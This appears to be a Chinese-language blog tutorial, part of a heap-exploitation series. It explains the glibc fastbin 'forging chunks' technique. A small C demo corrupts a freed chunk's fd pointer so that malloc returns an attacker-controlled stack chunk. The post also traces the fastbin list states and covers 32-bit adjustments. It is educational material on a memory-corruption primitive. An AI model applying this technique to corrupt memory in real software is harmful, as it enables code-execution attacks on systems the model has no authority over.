---
title: "heap利用 3/9: Forging Chunks"
date: 2023-02-05T15:36:08+08:00           

tags : [                                    
"heap利用",
]
categories : [                              
"heap利用",
]
keywords : [                                
"heap利用",
]
---

chunk被free后，会被插入到一个bin链表中，但是chunk对应的指针在程序中仍然可用。如果攻击者能够控制此指针，那么它就可以修改bin中的链表结构，从而插入攻击者自己伪造的chunk，这就是forging chunks利用。下面的示例程序展示了fast bin的情况下是如何实现伪造chunk的。

**示例程序**
```C
struct forged_chunk {
  size_t prev_size;
  size_t size;
  struct forged_chunk *fd;
  struct forged_chunk *bck;
  char buf[10];               // padding
};

// First grab a fast chunk
a = malloc(10);               // 'a' points to 0x219c010

// Create a forged chunk
struct forged_chunk chunk;    // At address 0x7ffc6de96690
chunk.size = 0x20;            // This size should fall in the same fastbin
data = (char *)&chunk.fd;     // Data starts here for an allocated chunk
strcpy(data, "attacker's data");

// Put the fast chunk back into fastbin
free(a);
// Modify 'fd' pointer of 'a' to point to our forged chunk
*((unsigned long long *)a) = (unsigned long long)&chunk;
// Remove 'a' from HEAD of fastbin
// Our forged chunk will now be at the HEAD of fastbin
malloc(10);                   // Will return 0x219c010

victim = malloc(10);          // Points to 0x7ffc6de966a0
printf("%s\n", victim);       // Prints "attacker's data" !!
```

其中，forged chunk的大小参数设置为0x20，以便绕过安全检查 'malloc():memory corruption(fast)'，为了检查chunk的大小是否落在特定fast bin的范围内。此外，从上述程序可以知道，victim指向forged chunk前面的 0x10(0x8+0x8) 字节，即allocated chunk的数据从`fd`指针开始。

\
**fast bin链表状态变化**

不同操作后对应fast bin链表的状态变化如下：
1. `a` 被free后。
>fast bin链表：head->a->tail
2. `a` 的`fd`指针被更改为指向`forged chunk`，而`forged chunk`的`fd`实际指向恶意代码。
>fast bin链表：head->a->forged chunk->undefined
3. `malloc` 请求后从链表中取出`a`。
>fast bin链表：head->forged chunk->undefined
4. 用户发出`malloc` 请求，`forged chunk`被返回给用户。
>fast bin链表：head->underfined

**注意**
1. 对于同一个bin链表中的fast chunk的另一个`malloc`请求将导致段错误。
2. 尽管我们请求的是10字节却将forged chunk的大小设置为32字节，但两者都落在fast bin的32字节chunk的范围内。
3. 针对small chunks和large chunks的攻击在后面的House of Lore一节可见。
4. 以上程序代码是为64位机器设计的。如若要在32位机器上运行，需将`unsigned long long`替换为`unsigned int`，因为指针大小会从8字节变为4字节。此外，不应该再使用32字节作为forged chunk的大小，小于17字节为好。
